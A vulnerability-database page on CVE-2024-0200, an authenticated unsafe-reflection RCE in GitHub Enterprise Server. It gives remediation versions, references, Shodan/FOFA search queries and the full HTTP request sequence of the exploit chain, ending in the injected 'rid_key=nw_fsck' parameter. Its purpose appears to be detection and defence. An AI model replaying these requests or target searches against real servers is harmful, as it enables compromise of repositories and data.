---
layout: "post"
cve_id: "CVE-2024-0200"
title: "Github Enterprise Authenticated Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-0200.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-0200.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
impact: "Authenticated attackers with organization owner privileges can exploit unsafe reflection to execute arbitrary code remotely, leading to complete compromise of the GitHub Enterprise Server instance and potential access to all repositories and data.
"
remediation: "Upgrade to GitHub Enterprise Server version 3.8.13, 3.9.8, 3.10.5, or 3.11.3 or later.
"
reference:
  - "https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/"
  - "https://blog.convisoappsec.com/en/analysis-of-github-enterprise-vulnerabilities-cve-2024-0507-cve-2024-0200/"
  - "https://docs.github.com/en/enterprise-server@3.10/admin/release-notes#3.10.5"
  - "https://docs.github.com/en/enterprise-server@3.11/admin/release-notes#3.11.3"
  - "https://docs.github.com/en/enterprise-server@3.8/admin/release-notes#3.8.13"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2024-0200', 'cwe-id': 'CWE-470', 'epss-score': 0.74112, 'epss-percentile': 0.98789, 'cpe': 'cpe:2.3:a:github:enterprise_server:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 7, 'vendor': 'github', 'product': 'enterprise_server', 'shodan-query': ['title:"GitHub Enterprise"', 'micro focus dsd'], 'fofa-query': 'app="Github-Enterprise"'}"
tags:
  - "cve"
  - "cve2024"
  - "rce"
  - "github"
  - "enterprise"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
An unsafe reflection vulnerability was identified in GitHub Enterprise Server that could lead to reflection injection. This vulnerability could lead to the execution of user-controlled methods and remote code execution. To exploit this bug, an actor would need to be logged into an account on the GHES instance with the organization owner role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.8.13, 3.9.8, 3.10.5, and 3.11.3.


## üåê HTTP Request
```nohighlight
GET /api/v3/user/orgs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Authorization: Basic Z05hcWR2OkdPWDlhM0J1
Accept-Encoding: gzip
```

```nohighlight
GET /api/v3/orgs/zqdIjT/memberships/gNaqdv HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Authorization: Basic Z05hcWR2OkdPWDlhM0J1
Accept-Encoding: gzip
```

```nohighlight
POST /api/v3/orgs/zqdIjT/repos HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.19
Connection: close
Content-Length: 47
Accept: */*
Accept-Language: en
Authorization: Basic Z05hcWR2OkdPWDlhM0J1
Content-Type: application/json
Accept-Encoding: gzip

{
  "name": "38BHnkVTBz0v8iy7UWtGxdpXTpS"
}
```

```nohighlight
GET /login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /organizations/zqdIjT/settings/actions/repository_items?page=1&rid_key=nw_fsck HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

